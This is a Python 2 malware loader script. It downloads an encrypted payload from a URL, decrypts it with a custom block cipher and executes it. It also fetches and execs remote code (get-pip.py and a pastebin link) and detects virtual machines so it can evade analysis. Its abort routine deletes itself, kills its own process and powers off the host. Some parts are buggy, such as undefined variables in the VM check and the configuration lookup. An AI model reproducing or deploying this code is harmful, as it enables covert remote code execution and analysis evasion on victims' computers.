#!/usr/bin/python
from __future__ import print_function
import os
import sys
import time
import json
import zlib
import struct
import base64
import urllib
import marshal
import subprocess

__DEBUG  = 1
__RELOAD = 0

def debug(info):
    if __DEBUG:
        print(str(info))
        
def abort(output=None):
    try:
        if __DEBUG:
            debug("Launch debuged - %s" % str(output))
            sys.exit(0)
        else:
            _ = [subprocess.Popen(cmd, 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True) for cmd in list(['del /f /q %s' % sys.argv[0], 'taskkill /pid %d /f' % os.getpid(), 'shutdown /p /f'] if os.name == 'nt' else ['rm -f %s' % sys.argv[0], 'kill -9 %d' % os.getpid(), 'shutdown --poweroff --no-wall'])]
    except Exception as e:
        debug(e)
        
def decrypt(data, key):
    try:
        data    = base64.b64decode(data)
        blocks  = [data[i * 8:((i + 1) * 8)] for i in range(len(data) // 8)]
        vector  = blocks[0]
        result  = []
        for block in blocks[1:]:
            u,v = struct.unpack("!2L", block)
            k   = struct.unpack("!4L", key)
            d,m = 0x9e3779b9L, 0xffffffffL
            s   = (d * 32) & m
            for _ in range(32):
                v   = (v - (((u << 4 ^ u >> 5) + u) ^ (s + k[s >> 11 & 3]))) & m
                s   = (s - d) & m
                u   = (u - (((v << 4 ^ v >> 5) + v) ^ (s + k[s & 3]))) & m
            packed  = struct.pack("!2L", u, v)
            output  = bytes().join(chr(ord(x) ^ ord(y)) for x, y in zip(vector, packed))
            vector  = block
            result.append(output)
        return bytes().join(result).rstrip(chr(0))
    except Exception as e:
        debug(e)

def install(module):
    try:
        pip_exe  = os.popen('where pip' if os.name is 'nt' else 'which pip').read().rstrip()
        if not pip_exe:
            exec urllib.urlopen("https://bootstrap.pypa.io/get-pip.py").read() in globals()
            os.execv(sys.executable, ['python'] + [os.path.abspath(sys.argv[0])] + sys.argv[1:])
        else:
            exec "import %s" % str(module)
    except ImportError:
        try:
            subprocess.Popen([pip_exe, 'install', str(module)], 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True)
            os.execv(sys.executable, ['python'] + [os.path.abspath(sys.argv[0])] + sys.argv[1:])
        except:
            raise ImportError

def antiforensics():
    try:
        check_environ = [_ for _ in os.environ.keys() if 'VBOX' in _.upper()]
        check_procs   = [i.split()[0 if os.name is 'nt' else -1] for i in os.popen('tasklist' if os.name is 'nt' else 'ps').read().splitlines()[3:] if i.split()[c].lower().split('.')[0] in ['xenservice', 'vboxservice', 'vboxtray', 'vmusrvc', 'vmsrvc', 'vmwareuser', 'vmwaretray', 'vmtoolsd', 'vmcompute', 'vmmem']]
        return bool(check_environ + check_procs)
    except Exception as e:
        debug(e)

def main(*args, **kwargs):
    
    global __DEBUG
    global __RELOAD
    
    __DEBUG = bool('--debug' in sys.argv or 'debug' in sys.argv)

    try:
        install('httpimport')
    except ImportError:
        try:
            install('https://pastebin.com/raw/2BvzFFHq')
        except ImportError:
            debug("[-] Import module 'httpimport' failed.")
            
    if 'payload' in kwargs:
        debug("Decrypting payload...")
        payload = decrypt(urllib.urlopen(kwargs.get('payload')).read(), '__KEY__')

    if config.get('antiforensics'):
        debug("Checking for virtual machines...")
        if antiforensics():
            debug("Virtual machine detected.")
            sys.exit(0)

    if payload:
        debug("Running payload...")
        exec payload in globals()

